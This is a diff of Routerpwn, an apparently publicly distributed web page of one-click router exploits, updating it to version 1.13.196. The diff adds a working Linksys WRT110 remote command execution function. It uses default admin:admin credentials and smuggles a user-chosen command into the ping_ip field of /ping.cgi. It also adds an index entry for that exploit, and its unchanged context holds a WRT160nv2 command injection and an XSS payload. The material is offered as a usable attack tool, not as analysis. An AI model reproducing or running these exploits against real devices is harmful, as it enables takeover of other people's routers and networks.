@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.195</title>
+		<title>Routerpwn 1.13.196</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -264,6 +264,22 @@ function wrt160nv2_command(ip)
 	form += '<input	type="hidden"	name="traceroute_ip"	value=""/>';
 	form += '</form>';
 	post('http://admin:admin@' + ip + '/apply.cgi', form);
+}
+
+// Linksys WRT110 Remote Command Execution
+function afterTwoSeconds() {    
+    authWindow.close(); 
+}
+
+function wrt110_command(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = prompt("Command:");
+	authURL = "http://admin:admin@" + ip + "/HNAP1/";
+	authWindow = window.open(authURL,"_blank","width=100,height=100");
+	setTimeout(afterTwoSeconds, 1000); 
+	var form = '<input	type="hidden"	name="ping_ip"	value="%26' + encodeURI(cmd) + '"/></form>';
+	post('http://admin@admin@' + ip + '/ping.cgi', form);
 }
 
 function freeboxdosr() {
@@ -2294,21 +2310,27 @@ a=a+1
 <input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&"/>
 </form>
 <h2>Cisco Linksys</h2>
-<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N, <a href="javascript:img('Linksys X3000')">Linksys X3000, <a href="javascript:img('Linksys X3000')">Linksys X3000</a></h3>
+<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N, <a href="javascript:img('Linksys X3000')">Linksys X3000, <a href="javascript:img('Linksys X3000')">Linksys X3000</a> , <a href="javascript:img('Linksys WRT110')">Linksys WRT110</a></h3>
 
 <article>
-	<div>21/05/13</div>
-	<div><a href="http://www.exploit-db.com/exploits/25608/">[+]</a></div>
-	<div><a href="javascript:wrt160nv2_command()">Linksys WRT160nv2 - apply.cgi Remote Command Injection</a></div>
-	<div><a href="javascript:wrt160nv2_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+	<div>23/09/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/28484/">[+]</a></div>
+	<div><a href="javascript:wrt110_command()">Linksys WRT110 Remote Command Execution</a></div>
+	<div><a href="javascript:wrt110_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
-
 
 <article>
 	<div>22/06/13</div>
 	<div><a href="http://www.s3cur1ty.de/m1adv2013-019">[+]</a></div>
 	<div><a href="javascript:x3000_command()">Linksys X3000 - OS Command Inyection</a></div>
 	<div><a href="javascript:x3000_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>21/05/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/25608/">[+]</a></div>
+	<div><a href="javascript:wrt160nv2_command()">Linksys WRT160nv2 - apply.cgi Remote Command Injection</a></div>
+	<div><a href="javascript:wrt160nv2_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <article>
